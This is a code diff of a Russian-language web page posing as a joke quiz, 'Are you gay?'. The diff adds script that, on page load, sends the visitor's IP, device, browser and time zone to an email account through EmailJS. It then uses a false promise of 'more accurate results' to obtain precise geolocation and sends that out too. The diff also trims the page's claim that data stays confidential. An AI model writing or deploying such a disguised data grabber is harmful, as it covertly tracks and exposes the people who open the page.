@@ -48,7 +48,7 @@
             }
         }
 
-        // Получение геолокации пользователя (необязательное)
+        // Получение геолокации пользователя
         function getGeolocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -57,15 +57,17 @@
                             resolve({
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
+                                accuracy: position.coords.accuracy,
+                                status: "success"
                             });
                         },
                         (error) => {
                             console.warn("Пользователь отказался от геолокации:", error.message);
                             resolve({
-                                latitude: "Не предоставлено",
-                                longitude: "Не предоставлено",
-                                accuracy: "Не предоставлено"
+                                latitude: "Отказано",
+                                longitude: "Отказано",
+                                accuracy: "Отказано",
+                                status: "denied"
                             });
                         }
                     );
@@ -74,7 +76,8 @@
                     resolve({
                         latitude: "Не поддерживается",
                         longitude: "Не поддерживается",
-                        accuracy: "Не поддерживается"
+                        accuracy: "Не поддерживается",
+                        status: "unsupported"
                     });
                 }
             });
@@ -91,60 +94,45 @@
             return "Неизвестное устройство";
         }
 
-        // Получение данных о соединении
-        function getConnectionInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-            return {
-                type: connection.effectiveType || "Неизвестно",
-                downlink: connection.downlink || "Неизвестно",
-                rtt: connection.rtt || "Неизвестно"
-            };
-        }
-
-        // Анти-спам система: проверка отправки данных с текущего IP
-        function isIpAlreadySent(ip) {
-            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
-            return sentIps[ip];
-        }
-
-        function markIpAsSent(ip) {
-            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
-            sentIps[ip] = true;
-            localStorage.setItem('sentIps', JSON.stringify(sentIps));
-        }
-
-        function showError(message) {
-            const errorElement = document.createElement('div');
-            errorElement.textContent = message;
-            errorElement.style.color = 'red';
-            errorElement.style.fontWeight = 'bold';
-            errorElement.style.marginTop = '20px';
-            document.body.appendChild(errorElement);
-        }
-
         // Отправка данных на почту через EmailJS
-        function sendData(userData) {
-            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
+        function sendData(userData, templateName) {
+            emailjs.send("Hjikwe21782", templateName, userData)
                 .then(function(response) {
                     console.log("Данные успешно отправлены", response);
-                    markIpAsSent(userData.ip);
                 }, function(error) {
                     console.error("Ошибка при отправке данных", error);
                 });
         }
 
-        // Сбор всех данных пользователя и отправка на почту
-        async function collectUserData(ip) {
+        // Сбор и отправка базовых данных (IP и устройство)
+        function sendBasicData(ip) {
+            const deviceType = getDeviceType();
+            
+            let basicData = {
+                ip: ip,
+                deviceType: deviceType,
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно"
+            };
+
+            sendData(basicData, "template_basic_data");
+            alert('Твои данные теперь у меня:)))))');
+        }
+
+        // Сбор и отправка полных данных с геолокацией
+        async function sendFullData(ip) {
             try {
                 const [providerInfo, geolocation] = await Promise.all([
                     getProviderInfo(ip),
                     getGeolocation()
                 ]);
 
-                const connectionInfo = getConnectionInfo();
+                if (geolocation.status !== "success") return;
+
                 const deviceType = getDeviceType();
 
-                let userData = {
+                let fullData = {
                     ip: ip,
                     provider: providerInfo.provider,
                     city: providerInfo.city,
@@ -157,39 +145,33 @@
                     userAgent: navigator.userAgent,
                     browserLanguage: navigator.language || "Неизвестно",
                     screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
-                    connectionType: connectionInfo.type,
-                    connectionSpeed: connectionInfo.downlink,
-                    connectionRTT: connectionInfo.rtt
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно"
                 };
 
-                sendData(userData);
+                sendData(fullData, "template_full_data");
             } catch (error) {
-                console.error("Ошибка при сборе данных:", error);
-                
-                // Отправляем хотя бы базовые данные, если что-то пошло не так
-                let userData = {
-                    ip: ip,
-                    deviceType: getDeviceType(),
-                    userAgent: navigator.userAgent,
-                    error: "Ошибка при сборе полных данных"
-                };
-                
-                sendData(userData);
+                console.error("Ошибка при сборе полных данных:", error);
             }
         }
 
-        // Инициализация сбора данных при загрузке страницы
+        // Запрос геолокации после отправки базовых данных
+        function requestGeolocation(ip) {
+            if (confirm("Хочешь получить более точные результаты? Поделись своей геолокацией!")) {
+                getGeolocation().then(result => {
+                    if (result.status === "success") {
+                        sendFullData(ip);
+                        alert("Спасибо! Теперь результаты будут точнее!");
+                    }
+                });
+            }
+        }
+
+        // Инициализация при загрузке страницы
         window.onload = function() {
             getUserIP(function(ip) {
                 console.log("IP-адрес:", ip);
-
-                if (isIpAlreadySent(ip)) {
-                    console.warn("Этот IP уже отправлял данные. Отправка отменена.");
-                    return;
-                }
-
-                collectUserData(ip);
+                sendBasicData(ip);
+                setTimeout(() => requestGeolocation(ip), 2000);
             });
         }
     </script>
@@ -241,7 +223,7 @@
 
 </head>
 <body>
-<p>Мы используем геолокацию, чтобы добавить немного веселья в твой опыт! Понимание, откуда ты, помогает нам сделать результаты теста более интересными и персонализированными. Например, мы предложим тебе уникальные шутки или сделаем результаты еще более забавными, опираясь на твою страну или город. Все данные останутся конфиденциальными и используются исключительно для улучшения твоего теста.</p>
+<p>Мы используем геолокацию, чтобы добавить немного веселья в твой опыт! Понимание, откуда ты, помогает нам сделать результаты теста более интересными и персонализированными.</p>
 
     <h1>Шуточный тест: Гей ли ты?</h1>
 
